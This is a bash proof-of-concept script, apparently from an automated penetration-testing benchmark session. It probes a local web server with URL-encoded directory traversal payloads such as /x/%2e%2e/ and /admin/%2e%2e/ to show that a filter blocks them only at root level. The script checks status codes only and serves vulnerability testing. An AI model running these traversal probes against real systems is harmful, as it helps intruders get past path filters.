#!/bin/bash
# POC: Demonstrates depth-dependent directory traversal filter bypass where encoded traversal patterns (%2e%2e/) are filtered at root level but bypass filtering at nested path levels (/x/%2e%2e/). Tests multiple depths and path variations.
# Target: ./repo
# Created: 2025-12-01T15:52:47.641Z
# Session: benchmark-XBEN-066-24-minbd201

# Depth-Dependent Directory Traversal Filter Bypass POC
# Demonstrates that security filter for encoded directory traversal (%2e%2e/)
# only applies to root-level paths but fails at deeper path levels

TARGET_HOST="${1:-localhost:32768}"
TARGET_URL="http://${TARGET_HOST}"

echo "=========================================="
echo "Directory Traversal Filter Bypass Analysis"
echo "Target: $TARGET_URL"
echo "=========================================="
echo ""

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test 1: Root level filter (should be 400)
echo "[*] Test 1: Root-level encoded traversal (should be FILTERED - 400)"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/%2e%2e/")
echo "    Request: /%2e%2e/"
echo "    Response: HTTP $RESPONSE"
if [ "$RESPONSE" = "400" ]; then
    echo -e "    ${GREEN}[✓] FILTERED (400 - as expected)${NC}"
else
    echo -e "    ${YELLOW}[!] UNEXPECTED ($RESPONSE)${NC}"
fi
echo ""

# Test 2: Depth 1 - single nested path (should be filtered but may not be)
echo "[*] Test 2: Depth 1 - nested path with encoded traversal"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/x/%2e%2e/")
echo "    Request: /x/%2e%2e/"
echo "    Response: HTTP $RESPONSE"
if [ "$RESPONSE" = "400" ]; then
    echo -e "    ${GREEN}[✓] Properly filtered (400)${NC}"
else
    echo -e "    ${RED}[✗] BYPASS DETECTED ($RESPONSE - Not filtered)${NC}"
fi
echo ""

# Test 3: Depth 1 - admin path with encoded traversal
echo "[*] Test 3: Depth 1 - /admin/ with encoded traversal"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/admin/%2e%2e/")
echo "    Request: /admin/%2e%2e/"
echo "    Response: HTTP $RESPONSE"
if [ "$RESPONSE" = "400" ]; then
    echo -e "    ${GREEN}[✓] Properly filtered (400)${NC}"
else
    echo -e "    ${RED}[✗] BYPASS DETECTED ($RESPONSE - Not filtered)${NC}"
fi
echo ""

# Test 4: Depth 1 - test path with encoded traversal
echo "[*] Test 4: Depth 1 - /test/ with encoded traversal"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/test/%2e%2e/")
echo "    Request: /test/%2e%2e/"
echo "    Response: HTTP $RESPONSE"
if [ "$RESPONSE" = "400" ]; then
    echo -e "    ${GREEN}[✓] Properly filtered (400)${NC}"
else
    echo -e "    ${RED}[✗] BYPASS DETECTED ($RESPONSE - Not filtered)${NC}"
fi
echo ""

# Test 5: Root level with query parameter (should be filtered)
echo "[*] Test 5: Root-level with query parameter"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/%2e%2e/?x=1")
echo "    Request: /%2e%2e/?x=1"
echo "    Response: HTTP $RESPONSE"
if [ "$RESPONSE" = "400" ]; then
    echo -e "    ${GREEN}[✓] Properly filtered (400)${NC}"
else
    echo -e "    ${YELLOW}[!] Not filtered ($RESPONSE)${NC}"
fi
echo ""

# Test 6: Depth 1 with query parameter (showing inconsistency)
echo "[*] Test 6: Depth 1 with query parameter"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/x/%2e%2e/?x=1")
echo "    Request: /x/%2e%2e/?x=1"
echo "    Response: HTTP $RESPONSE"
if [ "$RESPONSE" = "400" ]; then
    echo -e "    ${GREEN}[✓] Properly filtered (400)${NC}"
else
    echo -e "    ${RED}[✗] BYPASS DETECTED ($RESPONSE - Not filtered)${NC}"
fi
echo ""

# Test 7: Depth 2 - double nested path with encoded traversal
echo "[*] Test 7: Depth 2 - /x/y/ with encoded traversal"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/x/y/%2e%2e/")
echo "    Request: /x/y/%2e%2e/"
echo "    Response: HTTP $RESPONSE"
if [ "$RESPONSE" = "400" ]; then
    echo -e "    ${GREEN}[✓] Properly filtered (400)${NC}"
else
    echo -e "    ${RED}[✗] BYPASS DETECTED ($RESPONSE - Not filtered)${NC}"
fi
echo ""

# Test 8: Multiple encoded traversal sequences
echo "[*] Test 8: Depth 1 - multiple traversal sequences"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/x/%2e%2e/%2e%2e/")
echo "    Request: /x/%2e%2e/%2e%2e/"
echo "    Response: HTTP $RESPONSE"
if [ "$RESPONSE" = "400" ]; then
    echo -e "    ${GREEN}[✓] Properly filtered (400)${NC}"
else
    echo -e "    ${RED}[✗] BYPASS DETECTED ($RESPONSE - Not filtered)${NC}"
fi
echo ""

# Summary
echo "=========================================="
echo "SUMMARY"
echo "=========================================="
echo ""
echo "Filter Analysis:"
echo "- Root-level /%2e%2e/ paths: Filtered (400)"
echo "- Nested /x/%2e%2e/ paths: Check results above"
echo ""
echo "If nested paths return 404 instead of 400, this indicates"
echo "a depth-dependent filter bypass vulnerability."
echo ""